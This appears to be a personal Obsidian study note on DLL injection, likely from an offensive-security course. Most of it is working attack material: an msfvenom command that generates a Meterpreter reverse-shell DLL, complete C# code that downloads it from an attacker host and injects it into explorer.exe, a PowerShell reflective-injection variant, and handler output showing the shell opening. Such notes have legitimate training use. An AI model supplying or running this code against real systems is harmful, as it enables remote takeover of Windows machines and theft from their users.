---
creation date: December 28th 2022
last modified date: December 28th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[DLL Injection]]  
___

## Description:  

For injecting an entire DLL into a remote process instead of just shellcode

Generate a DLL and save it to your web root:
```
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o /var/www/html/met.dll
```
Full code:
```
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
namespace Inject
{
 class Program
 {
 [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
 static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int 
processId);
 [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
 static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint 
dwSize, uint flAllocationType, uint flProtect);
 [DllImport("kernel32.dll")]
 static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
 [DllImport("kernel32.dll")]
 static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr 
lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint 
dwCreationFlags, IntPtr lpThreadId);
 [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, 
SetLastError = true)]
 static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
 public static extern IntPtr GetModuleHandle(string lpModuleName);
 static void Main(string[] args)
 {
 String dir = 
Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
 String dllName = dir + "\\met.dll";
 WebClient wc = new WebClient();
 wc.DownloadFile("http://192.168.119.120/met.dll", dllName);
 Process[] expProc = Process.GetProcessesByName("explorer");
 int pid = expProc[0].Id;
 IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
 IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
 IntPtr outSize;
 Boolean res = WriteProcessMemory(hProcess, addr, 
Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
 IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), 
"LoadLibraryA");
 IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, 
addr, 0, IntPtr.Zero);
 }
 }
}
```
When we compile and execute the completed code, it fetches the Meterpreter DLL from the web server and gives us a reverse shell. This does write the .ddl to disk.

### Reflective DLL Injection

Open powershell with `PowerShell -Exec Bypass` 

```
$bytes = (New-Object 
System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll')
$procid = (Get-Process -Name explorer).Id
```

```
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
```

```
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```
This loads the DLL in memory and provides us with a reverse Meterpreter shell:
```
msf5 exploit(multi/handler) > exploit
[*] Started HTTPS reverse handler on https://192.168.119.120:443
[*] https://192.168.119.120:443 handling request from 192.168.120.11; (UUID: pm1qmw8u) 
Staging x64 payload (207449 bytes) ...
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.11:49678)
meterpreter >
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 28th 2022 (11:55 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
